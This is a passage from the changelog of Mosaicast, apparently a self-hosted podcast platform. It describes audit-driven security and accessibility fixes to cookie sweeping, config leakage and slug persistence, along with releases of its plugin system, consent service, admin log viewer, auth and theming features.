  category against the consent cookie's grammar, so `analytics.plausible` (or anything over 40 characters)
  rendered a toggle, was granted, made `has()` return true so the plugin proceeded — and never reached the
  cookie, leaving the origins permanently blocked while the UI insisted consent had been given.
- **Unusable storage declarations are refused at load (`0.5.16`).** A missing `name` and a bare `"*"` both
  disabled the purge sweep from the manifest side; `0.5.14` made the client survive them, this stops them
  reaching it.
- `ConsentCookie` has tests — absent cookie, empty and null values, case folding, the exact 40-character
  boundary, illegal tokens, hundreds of categories, and duplicate cookies. It had none, and it is what turns a
  visitor's decision into a security policy.



Six defects found by an independent security audit and code review of the `0.5.13` stack. The first two are
the reason this is a hotfix rather than a scheduled release: both are actively harmful on any instance
running `0.5.13`.

- **The cookie sweep no longer deletes cookies Mosaicast does not own (`0.5.14`, §12.5).** `sweepCookies`
  expired every script-visible cookie missing from core's own inventory, on every page load, and one of its
  three deletion scopes was the parent domain. On `podcasts.example.com` that reached `.example.com` — an
  SSO cookie set by `www.example.com`, a load-balancer affinity cookie, an operator's own tag, all destroyed
  by an unrelated application. The rule that works for `localStorage` (delete what nobody declared) cannot
  work for cookies, because `document.cookie` also shows what the rest of the domain set. Cookies are now
  swept by the inverse rule — **only names some manifest declared, removed exactly when their category is
  refused** — and no expiry is ever written for a `Domain` wider than the current host. Withdrawal still
  reaches everything consent governs, because governing it required declaring it.
- **Space activates buttons again while an episode is playing (`0.5.14`, WCAG 2.1.1).** The player's
  document-level shortcut called `preventDefault()` on Space without excluding controls that own the key.
  Browsers implement button activation by watching for that default action, so from the moment audio
  loaded, no button in the shell could be pressed by keyboard — including the consent banner's *Accept all*
  and *Reject all*. The handler now stands down wherever the focused element already answers to the key.
  The arrow-key seeks additionally stop scrolling the page.
- **A malformed manifest can no longer switch the purge off or blank the page (`0.5.14`, §12.5).** Two
  storage declarations did that. A `storage[]` entry with no `name` — an author writing `"key"` where the
  schema says `"name"` produces one — put a null in the allow-list, where `name.endsWith` threw: inside the
  storage sweep the throw was swallowed and enforcement silently stopped, and from the cookie sweep it
  escaped into an effect mounted above the router's error boundary and unmounted the shell to a blank page.
  And a declared name of `"*"` reduced the wildcard match to `startsWith('')`, true of every key on the
  origin, so one manifest line disabled both the sweep and the storage audit that shares the predicate — for
  core's keys as much as the plugin's own. Names that are not usable strings now authorise nothing, a
  wildcard needs a prefix, and the sweep cannot throw into its caller.
- **Episode slugs are actually persisted (`0.5.14`, §4.1).** `EpisodeRef.slug` was mapped
  `updatable = false`, which removes the column from every `UPDATE` Hibernate emits — including the one the
  boot-time backfill depends on. Instances upgraded from a pre-V13 schema kept `slug = NULL` on every boot
  while the log announced a successful backfill: no public URL, no `GET /api/episodes/{slug}`, no sitemap
  entry, and invisible to plugins resolving an episode scope. Immutability is enforced by
  `assignSlugIfAbsent` where it always was. The backfill now verifies its own post-condition and logs an
  error if any row is left without a slug, instead of only being able to report success.
- **Plugin config values are no longer written to the log (`0.5.14`).** `PluginSettingsService` interpolated
  the value into an `INFO` line, which `AppLogAppender` persists into `app_log` — rendered verbatim in the
  admin log viewer and indexed by its free-text search — as well as to stdout. A field the config API gates
  by role was readable from any log aggregator. The key is logged; the value never is.
- **A podcaster can no longer read back admin-only config values (`0.5.14`, §7.2).** `/config` is open to
  PODCASTER so per-field delegation works, and *writing* an `editableBy: admin` field was correctly refused
  — but the response was built from every declared field with its current value, so submitting one owned
  field (or an empty body, which validates vacuously) returned every admin secret alongside it. The response
  now carries values only for fields the caller may edit; an ADMIN sees everything, as before.


- **A failing feed now shows *why*** in Admin → Feeds. `lastError` was persisted, serialised into `FeedView`
  and sent to the browser, and the page rendered only the status word — so a broken feed showed `ERROR` with
  no way to find out what went wrong.


- **Previous/next navigation follows release order** (ARCHITECTURE §6.2, spec updated to match): the detail
  page and the player's auto-advance walk the feed's `publishedAt` order — the same sequence the browsable
  list shows — instead of season/episode number. Real feeds routinely omit `itunes:episode` (e.g. Acast), so
  a numberless trailer or bonus episode used to be coerced to "episode 0" and jump to the front of the
  sequence; it is now placed by its date. An episode without a `pubDate` still counts as the series start.
- **Upcoming episodes are no longer navigation neighbours** (§6.2): `PLANNED` episodes lead the *listing* but
  have no audio, and the nav sequence reused the listing order — so the oldest release had an unreleased
  episode as its "previous", and auto-advance could land on an unplayable one. The sequence now contains only
  released episodes; a planned episode's own page links back to the latest release.
- **Disabling a feed now hides it from the public site**, not just from polling (ARCHITECTURE §5.4/§6.1). A
  disabled feed and its episodes are excluded from the feed tabs (`GET /api/feeds`), the unified episode feed,
  per-feed listings, seasons/tags, and search, and its feed/episode detail pages 404. Nothing is deleted —
  re-enabling restores everything.

### Added

- **Admin log & health viewer (`0.5.7`, ARCHITECTURE §13):** everything the host knew about its own failures
  used to go to stdout and die with the container — an operator without a terminal could not find out why a
  plugin had vanished from the site. **Admin → Logs & health** now shows it.
  - **Capture is automatic:** a Logback appender records core's own log statements into a new `app_log` table
    (Flyway `V15`), so the ten existing WARN/ERROR sites — rejected plugin, failed feed poll, the catch-all
    500 — appear without their call sites being touched, and so does every one added later. Throwables are kept as expandable detail; `pluginId`/`feedId` travel via MDC, so entries can be
    filtered by plugin rather than by grepping message text.
  - **Writes never block a request:** entries go through a bounded queue drained by one daemon thread, in
    their own transaction, with drops counted and reported rather than applied as back-pressure. The writer
    cannot feed itself — a failure while storing an entry is reported to stderr, never through SLF4J.
  - **Viewer:** `GET /api/admin/logs` (filter by level, area, plugin, free text, time; paginated — the first
    paginated admin endpoint) plus `/logs/facets` for the dropdowns, an expandable detail row, and an
    off-by-default 10 s auto-refresh that pauses while a row is open.
  - **Health card:** `GET /api/admin/health` answers "is anything broken right now?" — every plugin's state
    *with its rejection reason*, every feed's poll state **including the error text**, error/warning counts for
    the last 24 h, version and uptime.
  - **Plugins can report their own trouble:** `POST /api/plugins/{id}/log`, gated exactly like the doc store
    (active plugin, signed-in user at the plugin's write floor), with size caps and a per-plugin rate limit so
    a component in a render loop cannot fill the table. An explicit report is always stored; *captured* log
    statements obey the configured threshold.
  - **Capture follows the code, not a spelling.** The core package prefix is derived from the appender's own
    package, so renaming the namespace cannot silently switch capture off. Plugins are recognised by the
    logger name the host gives them (`plugin.<pluginId>`) rather than by their package — a third-party plugin
    can live anywhere — and because the id is in the name, attribution also survives a plugin logging from its
    own thread, which a thread-local MDC would not. Backend plugins get such a logger from the SDK
    (`ctx.logger()`) when the plugin contract next bumps.
  - **The viewer is a table.** Time, level, area, source and message are fixed columns, so the message always
    starts at the same place instead of being pushed around by the length of whatever came before it. A caret
    marks the rows that can be expanded — only entries that actually carry a stack trace or structured
    context — so nobody has to click a row to find out whether there is anything under it.
  - **The application talks now.** Feed polls report item counts, what changed and how long they took;
    site settings log what changed old → new; branding, legal pages and their translations, plugin
    activation/config/purge, feed add/enable/interval/refresh, planned episodes, account creation, identity
    linking and access-token create/revoke all leave an entry. A startup summary records version, profile,
    Java, plugin contract, capture level, plugin states (naming any that are not running) and feed counts.
    Nothing per-request, and no secrets: token entries carry the prefix, never the secret, and account
    entries carry ids, not email addresses.
  - **Storing and showing are separate decisions.** The store keeps **INFO and above** (the dev profile
    lowers it to `DEBUG`), because the routine line before a failure is usually what explains it and an entry
    never stored cannot be found later. The viewer opens at **WARN and above** so nobody has to read chatter
    to find the problem — one dropdown away from everything else. The level filter means "this level *and
    above*": a view filtered to WARN that hid ERRORs would be actively misleading.
  - Retention prunes daily under ShedLock by age (30 days) and row cap (100 000); both configurable under
    `mosaicast.log.*`, as is `capture-level`.


- **Consent service (M5 E5d, `0.5.6`, ARCHITECTURE §12.5):** the platform consent mechanism, driven entirely
  by what plugins declare.
  - **The core stays banner-free.** It sets only strictly necessary and functional storage, so `GET /api/consent`
    returns an empty payload and the shell asks nothing — until an *active* plugin declares a category.
    `necessary` is never asked about, and switching a plugin off withdraws its ask again.
  - **The notice is generated, not written:** the banner names each category, the plugins that requested it and
    the third-party hosts they declared, and links the legal page marked `privacy` (§12.6). Decisions are per
    category, revocable via a **Cookie settings** entry in the footer (shown only where consent is asked for),
    and stored in `localStorage` so they work for anonymous visitors.
  - **`ctx.consent.has()` is real and denies by default** — it previously returned `true` unconditionally,
    the inverse of the SDK's own default. A plugin now gets exactly the permission the visitor granted.
  - **The declaration is also the permission:** the CSP is built per request from the declared
    `externalSources` of active plugins (`script-src`/`frame-src`/`connect-src`), so an undeclared third party
    stays blocked even if a plugin tries to load it, and a value that could break out of the header is dropped
    rather than escaped. The base policy stays `default-src 'self'`.
  - Consent declarations also surface in the admin plugin list as the §12.5 audit.

- **Plugin deep links, share metadata & sitemap (M5 E5c, `0.5.5`, ARCHITECTURE §6.4/§6.6/§7.4):** plugin
  content becomes linkable, shareable and discoverable.
  - **`/p/{pluginId}/*` is reserved:** the shell renders the plugin's slots in a new **`page`** region at site
    scope and hands the subpath below the prefix to the element as `ctx.route` — until now a stub. Only the
    addressed plugin renders there, and only if it declares a `page` slot.
  - **Server-side OpenGraph (§6.4):** link scrapers run no JS, so the host now answers `/p/{id}/…` itself with
    the shell plus injected `og:*`/`twitter:*` tags, taken from the plugin's optional `ShareMetadataProvider`
    (in the SDK since `0.3.0`, never called until now) and falling back to site-level metadata when a plugin
    has no provider or no match. The new `IndexHtmlService` is the seam M6 extends to episode/feed OG, JSON-LD
    and the no-JS content block. An unknown or switched-off plugin gets a **real 404** (§6.6, no soft-404).
  - **Dynamic `sitemap.xml` (§6.6):** episodes, feed views and legal pages, plus entries from each active
    plugin's optional `SitemapProvider`. A plugin's URLs are validated to sit under its own `/p/{id}/`
    namespace, so it cannot inject site URLs or another plugin's. Disabling a plugin removes its entries.
  - Plugin extension points are resolved through the retained PF4J manager and every call is isolated like a
    scheduled task: a provider that throws is logged and skipped, never breaking a render or the sitemap.
  - **Not yet:** `robots.txt`, the admin-configurable AI-crawler policy and JSON-LD stay M6.

- **Plugin admin UI (M5 E5c, `0.5.4`, ARCHITECTURE §7.2/§7.8):** **Admin → Plugins** becomes operable. Each
  plugin is a card with an **activation toggle**, a **generated config form** — one input per declared field,
  its kind chosen from the declared `type`, the delegated role shown next to the label, and a **Reset** that
  clears the override back to the manifest default — and a **Purge data** action behind a confirm that names
  the plugin and states what survives. A switched-off plugin is chipped `Disabled` and says plainly that it
  no longer renders, serves data or runs tasks, and that its backend stops at the next restart. Errors surface
  from problem+json rather than as a silent no-op.
  - **Not yet:** the page stays ADMIN-gated, so a podcaster cannot reach the fields the backend already
    delegates to them (`editableBy: podcaster`) — that needs the admin route opened to podcasters and is
    tracked with the rest of E5c.

- **Plugin config, activation & purge — backend (M5 E5c, `0.5.3`, ARCHITECTURE §7.2/§7.8/§8.5):** the host now
  owns per-plugin settings. Migration `V14` adds `plugin_activation` (absent row = enabled, so a fresh install
  needs no bookkeeping) and `plugin_config` (absent key = the manifest default still applies).
  - **Config persistence:** `PluginConfig` resolves **admin override → manifest default → empty**, read
    through on every call, so an edit applies without a restart. Only fields the manifest declares are
    readable, so a stale override can never surface as config.
  - **Activation (§7.8):** `PUT /api/admin/plugins/{id}/enabled`. Switching off takes effect **immediately**
    for every host-mediated surface — dropped from `GET /api/plugins/manifest` (the shell unmounts), data API
    and asset bundle 404, scheduled tasks stop firing, and the plugin's **doc-store writes are refused**, which
    also stops a thread it started itself. Its PF4J extension stays in process until the next boot, where the
    loader skips it entirely (status `DISABLED`). Full containment needs a restart either way — PF4J
    `stopPlugin` would not kill a plugin's own threads, so the host does not pretend otherwise.
  - **Purge (§7.8):** `POST /api/admin/plugins/{id}/purge` deletes every doc-store document of a plugin and
    reports the count. Activation and config survive on purpose — purging data is not a reset.
  - **Admin surface:** `GET /api/admin/plugins` now carries `enabled`, the declared `config` (type,
    `editableBy`, default, effective value, whether it is overridden) and the declared `consent` block.
    `PUT /api/admin/plugins/{id}/config` sets or clears overrides — a JSON `null` clears one; an undeclared
    field or a wrong-typed value is a 400, a field the caller's role may not edit a 403. Per §7.2 the endpoint
    is open to **PODCASTER** for fields delegated to them; activation and purge stay ADMIN.
  - **Manifest validation** now rejects a config field whose `type` is not `string`/`number`/`boolean`, whose
    `editableBy` is not `admin`/`podcaster`, or whose default contradicts its own declared type — the host
    renders and type-checks from this declaration, so it must be renderable at load time.
  - **Not yet:** the admin UI for all of this (next), deep links/SEO (E5c), consent (E5d).

- **Readable episode slugs (`0.5.2`, ARCHITECTURE §4.1):** every episode now has a stable, human-readable
  **slug** (e.g. `the-sample-cast-s01e06`) as its public identifier, while the UUID stays the internal key.
  - Minted once at creation from the feed title + season/episode (title fallback; numeric suffix on
    collision) and **immutable** — a later feed-title/number edit never re-slugs an episode, so URLs and
    plugin data never orphan. Existing episodes are backfilled at boot. Migration `V13`.
  - **Public URLs and the episode API use the slug:** `/episodes/{slug}` and `GET /api/episodes/{slug}`
    (+ `/adjacent`). `EpisodeSummary`/`EpisodeDetail` now carry both `slug` (public) and `id` (UUID, used for
    listening progress and audio).
  - **Plugins address episodes by slug:** `ctx.episodes` and the episode `scope.id` are slugs (so a plugin's
    doc-store path `data/episode/{slug}/…` matches the episode URL), and a new `ctx.episodeLabels` gives each
    a display label (`S01E06 · <title>`) so plugin pickers show titles, not ids. Backed by
    `GET /api/plugins/scope-episodes` returning `[{id, label}]`.



- **Plugin system — frontend mounting (M5 E5b, `0.5.1`, ARCHITECTURE §7.3/§7.5):** the shell now renders
  plugins.
  - **Mounting:** on load the shell fetches `GET /api/plugins/manifest`, injects each plugin's frontend bundle
    once (`/plugins/{id}/assets/{entry}`), and mounts its Web Components into the slot regions — matched by
    `placement` + scope level, gated by `visibleTo`, stacked by `order` — each in the existing error boundary
    so a throwing plugin blanks only its own tile.
  - **Context (`ctx`):** the host sets the SDK `PluginContext` on each element — resolved `scope`, host-filtered
    `episodes` (new public `GET /api/plugins/scope-episodes`), `user`, a namespaced `api` client over the
    doc-store surface, `locale` and `theme` tokens; `consent`/`filter`/`player`/`route`/`progress` are wired
    where cheap and stubbed where their mechanism lands later (E5c/E5d). Reassigning `ctx` re-renders.
  - **Admin surface:** an **Admin → Plugins** page lists every discovered plugin with its load state and shows
    a warning for any rejected plugin with its reason (`GET /api/admin/plugins`, §7.8).
  - **Not yet:** the generated config form and activation toggle (need config persistence); deep-links/SEO
    (E5c); consent (E5d).

- **Plugin system — backend loading (M5 E5a, `0.5.0`, ARCHITECTURE §7):** the host now loads PF4J plugins from
  `MOSAICAST_PLUGINS_DIR` at startup and gives each a `PluginContext`.
  - **Loading & failure isolation (§7.1/§7.8):** each plugin is a folder (`plugin.json` + backend JAR +
    `assets/`); a `MosaicastPluginManager` reads the manifest and loads the JAR. A bad manifest, an
    incompatible `platformApi` (must match host `0.3.x`), a declared relational `schema` (deferred, §7.6), or a
    thrown exception disables only that plugin — recorded as **rejected with a reason** — while the host keeps
    booting. No plugin can crash the host.
  - **`PluginContext` (§7.4):** a hard-scoped generic **doc store** over a new `plugin_data` JSONB table
    (Flyway `V12`), `PluginConfig` from the manifest, host-resolved `FeedAccess.episodesIn/display` (reusing the
    enabled-feed visibility filter), and ShedLock-wrapped `onSchedule`. `schema()` is `null` in v1.
  - **Generic HTTP surface (§7.6):** `GET/PUT/DELETE /api/plugins/{id}/data/{scopeType}/{scopeId}/{key}` and a
    paginated list, mirroring the doc store one-to-one (there are no plugin-authored routes); reads gated by the
    plugin's `visibleTo` floor, writes by the mapped role. Plus public `GET /api/plugins/manifest` (for the shell
    to mount, E5b), `GET /api/admin/plugins` (load state, ADMIN), and `/plugins/{id}/assets/**` bundle serving
    with ETags.
  - **Not yet:** frontend mounting of plugin Web Components, config admin form and activation UI (E5b);
    SEO/deep-links (E5c); consent (E5d); relational schema provider (E5e).


- **i18n scaling, legal editor & shell polish (M4.2, `0.4.6`):**
  - **Site default language** on `SiteConfig` (Flyway `V11`, ARCHITECTURE §12.7), set in Site & branding:
    it is the **legal-page fallback** (replacing the hardcoded `en`) and the **initial UI language** when a
    visitor's browser language isn't one we ship (an explicit stored choice still wins).
  - **Dynamic language menu:** the top-bar EN⇄DE toggle becomes a dropdown built from the *registered* i18n
    locales, and the legal editor's per-language tabs come from the same set — adding a language is just a new
    `locales/*.json` + one registration line; nothing else changes.
  - **Legal editor redesign:** a collapsed page list with **Edit**, opening a **tabbed** title/markdown editor
    (one tab per UI language) instead of stacking every locale — scales past two languages.
  - **Polish:** dropdown triggers restyled (consistent height, ▾ caret, subtle open animation), the ⓘ button
    no longer taller than its neighbours, the accent picker is a styled swatch, and the footer credits
    **"Powered by Mosaicast <ver>"** linking to the GitHub repo.

- **Admin round-2 (M4.1, `0.4.5`):** operator-facing follow-ups to the E4 admin surface.
  - **Legal pages now appear** (§12.5/§12.6): the authored privacy/imprint/terms pages — reachable via the
    API but rendered nowhere — now show as **footer links** and in an always-visible **top-bar info menu**
    (reachable from every page without scrolling), with a public `/legal/:slug` route rendering the
    server-sanitized HTML. The persistent player no longer overlaps the footer. Flyway `V10` seeds factual,
    template-marked **privacy + imprint** pages (EN/DE) that document the only client storage the core sets
    (session + CSRF cookies; a few functional `localStorage` keys). All strictly necessary/functional, so the
    core stays **banner-free** (ePrivacy Art. 5(3) / DE § 25 TDDDG); transparency is provided via the notice.
  - **User management** (§8.5): `GET /api/admin/users` + `PUT /api/admin/users/{id}/role` and an
    `/admin/users` page (ADMIN). Admins can grant up to ADMIN; the server rejects changing your own role and
    demoting the last admin. Role changes take effect on the user's next request.
  - **Per-feed poll interval** (§5.4): `POST /api/admin/feeds/{id}/poll-interval` (clamped 5 min – 7 days)
    with a preset selector in the feeds admin — the interval was stored but not editable.
  - **UX fixes:** dropdown menus (account/login/info) close on outside-click, Escape, item select and route
    change (were native `<details>`); the Site & branding form now prefills the **saved** theme mode + accent
    seed (it read the site config before it loaded and never refreshed after save).

### Roadmap

- **Disabled buttons must look disabled (UI polish, next shell change):** `styles.css` has no `:disabled`
  rule at all, so a disabled `.mc-btn` is visually identical to an active one — it still shows the pointer
  cursor and full contrast. **Admin → Legal pages → "Create page"** is the reported case (disabled until a
  slug is typed, so it reads as a dead button), but the same applies everywhere the shell disables a control.
  Fix once in `.mc-btn:disabled` (reduced opacity, `cursor: not-allowed`, no hover state), not per page.

- **Consent service (§12.5):** the full category-based cookie consent (necessary / functional / analytics /
  plugin-declared, `ctx.consent`, click-to-load placeholders, generated notice) is **plugin-driven** and
  lands with **E5 (plugins)** — no banner is needed until a plugin sets non-essential cookies.

- **Admin UI (E4d, `0.4.4`, ARCHITECTURE §8.5/§12):** a role-gated admin area (`/admin`) over the existing
  M3 backends — **Site & branding** (name, theme mode, accent seed with live preview, logo/favicon/dark-logo
  upload + clear; ADMIN), **Legal pages** mini-CMS (create/edit/delete pages + per-locale markdown; ADMIN),
  and **Feeds** (list with poll state, enable/disable, refresh, add-with-preview, and confirm/dismiss of the
  fuzzy PLANNED-binding suggestions; PODCASTER+). New admin read `GET /api/admin/legal` (pages + raw
  translations for the editor).
- **Account & auth UI (E4c, `0.4.3`, ARCHITECTURE §8):** log in from the shell (Discord `oauth2Login`, plus
  a dev-login option under the `dev` profile), an account menu (avatar / name / role), and an **account page**
  — linked identities (connect / unlink, with last-identity lockout) and personal access tokens (create shows
  the secret once, revoke). Player **listening progress** now syncs server-side for logged-in users
  (`GET`/`PUT /api/me/progress`, Flyway `listening_progress`); anonymous stays local. `GET /api/meta` reports
  `devLoginEnabled`.

## [0.4.2] — 2026-07-11

### Added

- **Shell v2 — rich cards, real covers, tabs & tags (E4b+, `0.4.2`, §6):** hands-on revision of the shell.
  Feeds now surface **real cover art** (`itunes:image`, episode → feed fallback via the SDK's new
  `DisplaySnapshot.artwork()`), **author** and **subtitle**; the feed is a **one-column, cover-left card**
  (prominent cover, feed + author, title + subtitle, S·E · date · runtime, description excerpt). The home is
  **per-feed tabs** (All + one per feed; a single-feed site shows no tabs and lives at the feed's own URL,
  so bookmarks survive adding feeds). New **tag** filter (`itunes:keywords`/`<category>` → `episode_tag`,
  Flyway V7) alongside season/order; `GET /api/tags` + a `tag` param on `GET /api/episodes`. The persistent
  **player** now shows cover + feed + S·E and links to the episode. Requires SDK **0.2.0**
  (`DisplaySnapshot` gains `imageUrl`/`feedImageUrl`/`author`/`subtitle`). Spec updated: ARCHITECTURE
  §4.2/§6.1, BRIEF §E4. Host-defined **subfeeds** (saved filters) noted as a future milestone.
  - Follow-up polish: the feed view is now **two-column** — a left **scope panel** (feed cover/title/author/
    description + a `feed` plugin region on a feed tab; site logo/name + a `site` region on All) beside the
    episode list, which **infinite-scrolls** (auto-load + Load-more fallback) instead of paginating. Feed
    metadata (cover/description/author) is stored on the feed (Flyway V8) and served by `GET /api/feeds/{id}`.
    Card play button reveals on hover (and is always shown on touch).

- **React/Vite shell — foundation (E4a, M4 `0.4.x`, ARCHITECTURE §6, §12.3):** the walking-skeleton shell
  becomes the real app foundation — semantic theme tokens applied at runtime from the site payload with a
  **no-flash** pre-paint script (external, CSP-`self`-friendly), persistent **top-bar chrome** + footer,
  client-side **routing** (react-router), and a typed **API client** (cookie session + CSRF). New public
  **feed catalog** `GET /api/feeds` (slim `PublicFeedView` — no admin fields leak) drives the home index.
  Plugin **slot regions** (`top`/`card`/`main`/`sidebar`/`player`) are established as empty,
  error-boundaried mount points for E5. Feed/detail views + persistent player land in E4b.
- **Multi-arch release image:** the release workflow now builds+pushes `linux/amd64` **and** `linux/arm64`
  (QEMU + Buildx), so the host runs on Raspberry Pi / Apple Silicon / AWS Graviton.
- **React/Vite shell — unified feed, detail & player (E4b, `0.4.1`, §6):** the **unified episode feed** is
  now the centerpiece — episodes across all feeds as wide cards with generative covers, and **feed / season
  / ordering as filters** (state in the URL, §6.1); the feed catalog is a filter, not the landing list.
  Per-feed pages (`/feeds/:id`) reuse the same view scoped to one feed. **Detail page** with hero, sanitized
  show notes (DOMPurify), and fixed **previous/next** navigation (§6.2). A **persistent player** (survives
  route changes) with play/seek/volume, the **Media Session API**, **auto-advance** to the next episode, and
  listening-progress persistence to localStorage (server-side sync for logged-in users comes in E4c). New
  public reads: `GET /api/episodes` (site-scope list, `feedId`/`season`/`order` filters) and
  `GET /api/episodes/{id}/adjacent`.

- **Storage, branding & theming (M3, ARCHITECTURE §11–§12):**
  - `BlobStore` interface + `PostgresBlobStore` (BYTEA) with server-side byte-range reads and namespace
    routing (audio moves to S3 later without touching callers).
  - `SiteConfig` (single row) + public `GET /api/site` and ADMIN edit; the theme is generated from one
    accent in **OKLCH** with a **WCAG AA contrast clamp**, so no accent can produce unreadable text.
  - Branding assets served at `/branding/{logo,favicon,dark-logo}` with ETag/304 and bundled-default
    fallback; admin upload/clear; **uploads are raster-only** (SVG rejected as an XSS vector) with a size cap.
  - Legal-pages mini-CMS: admin CRUD over per-locale markdown pages (slug, title, role marker, sort order),
    a public footer list with locale fallback, and sanitized markdown rendering.
- **Auth & identity (M2, ARCHITECTURE §8):** social login (Discord) via Spring Security `oauth2Login`,
  `User` + `LinkedIdentity` keyed on `(provider, external_id)`, account-merging rules (§8.3), server-side
  sessions with CSRF, RBAC (ADMIN/PODCASTER/FAN), env-bootstrapped admin, `/api/me` + identity management
  with last-identity lockout protection, podcaster-scoped personal access tokens, and a `dev`-profile-only
  login bypass for local testing.

### Security

- Auth hardening from code review: role changes and account deletion now take effect on the **next
  request** (per-request user reload, no stale sessions); linking a provider already owned by another
  account is rejected instead of switching accounts; the §8.3 verified-email case uses the **conservative
  variant** (require explicit linking, never merge silently) with normalized email matching; the API is
  **deny-by-default** (`/api/**` denies unless explicitly allowed); `/api/admin/**` beyond feeds is
  ADMIN-only; the session cookie is `Secure` by default (off only in the `dev` profile); and personal
  access tokens throttle their "last used" writes.

### Fixed

- Code-review pass over M0–M3 (availability, correctness & spec completeness):
  - Public episode endpoints no longer 500 on a client `sort` parameter — the server owns the ordering
    (FTS rank / canonical order), so the incoming sort is stripped.
  - The feed scheduler survives a poisoned feed: any poll error backs the feed off (admin-visible) and the
    tick continues to the next feed instead of aborting.
  - Concurrent reconciliation of one feed (a scheduler tick racing "refresh now") is serialized with a
    pessimistic row lock, so the two can no longer both insert the same GUID and 500.
  - Episode list/search resolve their display snapshots in a single batch query instead of one-per-row (N+1).
  - Branding serving uses `no-cache` (a change propagates immediately via a cheap 304), honours the real
    `If-None-Match` grammar (`W/…`, lists, `*`) via Spring's `checkNotModified`, and no longer loads the
    asset bytes before a 304 or 404s on the read-after-stat race (falls back to the bundled default).
  - A failed social login now carries its reason to the shell (`/?login_error=account_conflict|link_required`)
    instead of a bare flag.

- **Fuzzy PLANNED-binding confirm flow (ARCHITECTURE §5.3):** reconciliation's fuzzy-title suggestions are
  now persisted (`binding_suggestion`, Flyway V6) instead of only logged, and the podcaster can review them
  (`GET /api/admin/feeds/{feedId}/suggestions`), confirm one (`POST …/suggestions/{id}/confirm` — binds the
  planned episode to the feed item and removes the auto-created duplicate), or dismiss it
  (`DELETE …/suggestions/{id}`). Still never auto-applied.

## [0.1.0] — 2026-07-07

First milestone: the host boots, serves the shell, and ingests RSS feeds.

### Added

- **Walking skeleton (M0):** Spring Boot 3 / Java 21 backend, React + Vite shell served from the
  backend, Flyway migrations, baseline security headers (CSP, `X-Content-Type-Options`,
  `Referrer-Policy`), RFC 7807 error handling, Actuator health, multi-stage Dockerfile, and CI.
- **Domain & feed pipeline (M1, ARCHITECTURE §4–§6):**
  - Two-layer model: `EpisodeRef` (authoritative identity — status `PLANNED`/`PUBLISHED`/`WITHDRAWN`,
    season relation, access) and `EpisodeDisplay` (non-authoritative feed snapshot).
  - Capability-driven `FeedSource` SPI with an RSS implementation (Rome + iTunes module) polling via
    HTTP conditional GET (ETag / If-Modified-Since).
  - Reconciler: the three GUID cases (create / refresh / withdraw — never hard-delete) plus PLANNED
    binding (exact season/episode auto-binds; fuzzy title only suggests).
  - ShedLock-wrapped scheduler with exponential backoff; "refresh now" endpoint.
  - Paginated public read API, full-text episode search, and admin feed / planned-episode management,
    all with `application/problem+json` errors.
- **Branding:** default Mosaicast logo + mark, used as favicon and header until custom branding lands.
- **Versioning:** `/api/meta` exposes the core version (single source: `gradle.properties`), shown in
  the shell alongside the plugin SDK version.
- **i18n:** English (source) + German, with an anonymous language switcher.

[Unreleased]: https://github.com/Mosaicast/mosaicast-core/compare/v0.6.14...HEAD
[0.6.14]: https://github.com/Mosaicast/mosaicast-core/compare/v0.4.2...v0.6.14
[0.4.2]: https://github.com/Mosaicast/mosaicast-core/compare/v0.1.0...v0.4.2
[0.1.0]: https://github.com/Mosaicast/mosaicast-core/releases/tag/v0.1.0
